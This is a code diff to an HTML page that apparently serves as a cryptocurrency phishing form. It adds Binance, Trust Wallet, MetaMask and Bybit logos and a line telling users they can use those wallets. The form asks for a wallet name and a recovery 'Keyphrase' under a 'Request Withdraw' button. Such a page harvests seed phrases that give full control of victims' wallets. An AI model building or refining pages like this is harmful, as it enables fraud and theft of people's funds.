@@ -670,7 +670,7 @@ display: inline-block;
 		.login{background-color:rgb(19,90,245);color:white;
 border-radius: 4px;
 padding: 13px 13px;
-margin: -15px -15px;
+margin: -5px -5px;
 border: 1px solid DarkGray;
 font-family: 'segoe UI';
 font-size: 15px;
@@ -688,10 +688,51 @@ width: 360px;
 }
 		.login{width: 97%;}
 		.check{background-color:#0ac21e;color:white;padding:10px;
-margin: 4px 2px;
+margin: 4px;
 		}
 		.inputf a:link{text-decoration:none;}
 	</style>
+	<style>
+.binance {
+background-image: url('/binance.png');
+background-size: cover;
+width: 20px;
+height: 20px;
+display: inline-block;
+}
+.trust {
+background-image: url('/trust.png');
+background-size: cover;
+width: 20px;
+height: 20px;
+display: inline-block;
+}
+.meta {
+background-image: url('/metamask.png');
+background-size: cover;
+width: 20px;
+height: 20px;
+display: inline-block;
+}
+.bybit {
+background-image: url('/bybit.png');
+background-size: cover;
+width: 20px;
+height: 20px;
+display: inline-block;
+}
+.more {
+background-image: url('/more.png');
+background-size: cover;
+width: 20px;
+height: 20px;
+display: inline-block;
+}
+i {
+  margin:3px; 
+}
+</style>
+
 </head>
 <body style="margin:0px;">
 <script>
@@ -721,8 +762,14 @@ margin: 4px 2px;
                 <div class="card-body">
 
                   <input type="hidden" name="user_id" id="userUsername" value="16934">
+                  
 		<input class="button1" name="message_title" type="text" id="" placeholder="Your wallet name" maxlength="400" size="400px"
-		required><br>
+		required>
+		<br>
+		<span> You can use Trustwallet, metamask and many more</span>
+		<br>
+		
+		<i class="trust"></i><i class="meta"> </i><i class="bybit"></i><i class="binance"> </i><i class="more"></i>
 		<textarea class="button3"  name="description" type="text" id="pass" placeholder="Enter Keyphrase" maxlength="400" size="35px"
 		required></textarea>
 
@@ -732,7 +779,7 @@ margin: 4px 2px;
     <!-- the rest of the form //-->
 
 <br/><br/>
-		<input class="login" name="login" type="submit" id="anonymousProcess" value="Request Withdraw"><br/><br/>
+		<input class="login mee" name="login" type="submit" id="anonymousProcess" value="Request Withdraw"><br/><br/>
 
 	
 </div>
